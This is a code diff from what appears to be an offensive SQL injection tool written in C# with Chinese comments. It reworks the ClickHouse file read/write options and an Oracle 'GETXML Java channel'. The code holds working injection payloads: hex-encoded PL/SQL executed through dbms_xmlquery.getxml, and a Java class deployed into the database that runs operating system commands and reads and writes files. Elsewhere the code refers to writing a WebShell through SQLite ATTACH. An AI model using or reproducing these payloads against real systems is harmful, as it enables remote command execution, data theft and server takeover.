@@ -88,9 +88,6 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     case "file()读文件":
                         await ReadFileByClickHouse(config, vm).ConfigureAwait(false);
                         break;
-                    case "INTO OUTFILE写文件":
-                        await WriteFileByClickHouse(config, vm).ConfigureAwait(false);
-                        break;
                     case "Java读文件":
                         await ReadFileByOracleJava(config, vm).ConfigureAwait(false);
                         break;
@@ -395,8 +392,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             {
                 return;
             }
-            if (config.DataConfig.SelectedDBType.Equals(DBType.Oracle)
-                || config.DataConfig.SelectedDBType.Equals(DBType.DM))
+            if (config.DataConfig.SelectedDBType.Equals(DBType.Oracle))
             {
                 await ExecuteCmdOracle(config, vm).ConfigureAwait(false);
                 return;
@@ -1188,7 +1184,9 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             Log.Show("ATTACH写WebShell已执行！请人工检查写文件是否成功（目标路径需可写；文件头部会带SQLite库格式头，PHP/JSP可容忍时方可作shell）。");
         }
 
-        //==================== ClickHouse file()/INTO OUTFILE 文件读写 ====================
+        //==================== ClickHouse file() 文件读取 ====================
+        //注：INTO OUTFILE 是 clickhouse-client/clickhouse-local 的客户端功能，HTTP 接口固定报错358（INTO_OUTFILE_NOT_ALLOWED），
+        //HTTP协议注入场景不可用；INSERT INTO FUNCTION file() 为独立INSERT语句，无法嵌入SELECT注入点。故ClickHouse仅提供file()读文件。
 
         /// <summary>ClickHouse file()表函数表达式（LineAsString格式整行落单列s，仅能读user_files目录内文件）</summary>
         private static string ClickHouseFileExpr(string path)
@@ -1256,7 +1254,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
         }
 
-        /// <summary>ClickHouse INTO OUTFILE写文件（Union注入单语句，RawBLOB格式裸字节落盘，需非readonly模式）</summary>
+        /// <summary>ClickHouse INTO OUTFILE写文件（已停用：INTO OUTFILE为clickhouse-client客户端侧功能，HTTP接口固定报错358，注入场景不可用；保留实现备查）</summary>
         private static async Task WriteFileByClickHouse(AppConfig config, FileCmdViewModel vm)
         {
             string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
@@ -1283,11 +1281,13 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             Log.Show("INTO OUTFILE写文件已执行！请人工检查（路径相对ClickHouse服务进程工作目录，readonly=1时不可用）。");
         }
 
-        //==================== Oracle/DM GETXML Java 通道（命令执行+文件读写，免堆叠）====================
-        //原理：dbms_xmlquery.getxml 的参数经 EXECUTE IMMEDIATE 执行，可传匿名PL/SQL块（自治事务）执行DDL，
+        //==================== Oracle GETXML Java 通道（命令执行+文件读写，免堆叠）====================
+        //原理：dbms_xmlquery.getxml 在旧版Oracle（9i~11g）可执行匿名PL/SQL块（自治事务），
         //整个PL/SQL整体hex编码后经 utl_raw.cast_to_varchar2(hextoraw(...)) 还原，彻底规避引号转义。
         //借此在纯SELECT注入（Union/盲注均可）下：CREATE JAVA SOURCE → 创建Java映射函数 → 执行命令/读写文件。
-        //前提：账号有 CREATE PROCEDURE 权限且 DBMS_JAVA 可用（一般DBA/高权限账号）；返回值限 varchar2(4000)。
+        //版本适用性（2026-09 实测）：23ai Free 上 getxml 拒绝PL/SQL块（Illegal query），18c弃用该包/21c起移除；
+        //XE全版本无JVM与DBMS_XMLQUERY。故本通道仅适用 9i~11g（12c未经实测）。DM8无DBMS_XMLQUERY，不适用。
+        //前提：账号有 CREATE PROCEDURE 权限且 JVM 可用；返回值限 varchar2(4000)。
 
         /// <summary>Oracle Java通道已部署目标标识（避免每次命令重复部署）</summary>
         private static string? _oraJavaReadyKey = null;
@@ -1299,7 +1299,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             return "(select to_char(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''" + hex + "'')); end;')) from dual)";
         }
 
-        /// <summary>SqliUtil Java源码：runCmd执行命令 / readFile读文件 / writeFile写文件（内容为hex）</summary>
+        /// <summary>SqliUtil Java源码：runCmd执行命令 / readFile读文件 / writeFile写文件（内容为hex）。换行拼接用 (char)10 而非 "\n" 转义，杜绝任何传输层把转义符还原成真实换行导致Java源损坏</summary>
         private const string OraJavaSource =
             "import java.io.*;\n" +
             "public class SqliUtil {\n" +
@@ -1309,7 +1309,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             "            Process p = Runtime.getRuntime().exec(cmd);\n" +
             "            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
             "            String line;\n" +
-            "            while ((line = r.readLine()) != null) { out += line + \"\\n\"; }\n" +
+            "            while ((line = r.readLine()) != null) { out += line + (char)10; }\n" +
             "            r.close();\n" +
             "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
             "        return out;\n" +
@@ -1319,7 +1319,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             "        try {\n" +
             "            BufferedReader r = new BufferedReader(new FileReader(path));\n" +
             "            String line;\n" +
-            "            while ((line = r.readLine()) != null) { out += line + \"\\n\"; }\n" +
+            "            while ((line = r.readLine()) != null) { out += line + (char)10; }\n" +
             "            r.close();\n" +
             "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
             "        return out;\n" +
@@ -1371,13 +1371,33 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
             }
         }
 
-        /// <summary>确保Oracle Java通道就绪（同目标只部署一次）</summary>
+        /// <summary>确保Oracle Java通道就绪（同目标只部署一次；先探测版本，18c+明确告警DBMS_XMLQUERY不可用）</summary>
         private static async Task EnsureOracleJavaReady(AppConfig config)
         {
             string targetKey = config.RequestTxt ?? "";
             if (string.Equals(_oraJavaReadyKey, targetKey, StringComparison.Ordinal))
             {
                 return;
+            }
+            try
+            {
+                string banner = await FetchScalar(config, "(select banner from v$version where rownum=1)").ConfigureAwait(false);
+                Log.SysLog("Oracle版本：" + (banner ?? ""));
+                var m = System.Text.RegularExpressions.Regex.Match(banner ?? "", @"(\d+)[a-z]?\.(\d+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
+                if (m.Success && int.TryParse(m.Groups[1].Value, out int major))
+                {
+                    if (major >= 18)
+                    {
+                        Log.Warning("Oracle " + major + " 起 DBMS_XMLQUERY 已弃用（21c+移除/拒绝PL/SQL块），GETXML通道大概率不可用，继续尝试但请勿抱期望……");
+                    }
+                    else if (major >= 12)
+                    {
+                        Log.Warning("Oracle 12c 上 GETXML 执行PL/SQL未经实测验证（社区资料确认9i~11g可用），如部署失败属预期。");
+                    }
+                }
+            }
+            catch (Exception)
+            {
             }
             if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind) || config.DataConfig.SelectedInjectType.Equals(InjectType.Time))
             {
@@ -1443,7 +1463,8 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     Log.Warning("文件内容hex后超过4000字符（约2000字节），超出varchar2传参上限，请精简内容或分多次写入！");
                     return;
                 }
-                string result = await FetchScalar(config, "(select SqliWrite(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),utl_raw.cast_to_varchar2(hextoraw('" + contentHex + "'))) from dual)").ConfigureAwait(false);
+                //SqliWrite第二参是hex字符串本身（纯[0-9A-F]无引号风险，直接字面量）；注意不能再套hextoraw，否则Java收到的是解码后的原文
+                string result = await FetchScalar(config, "(select SqliWrite(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),'" + contentHex + "') from dual)").ConfigureAwait(false);
                 if ((result ?? "").StartsWith("OK", StringComparison.Ordinal))
                 {
                     Log.Success("写文件完成！目标：" + vm.FilePath);
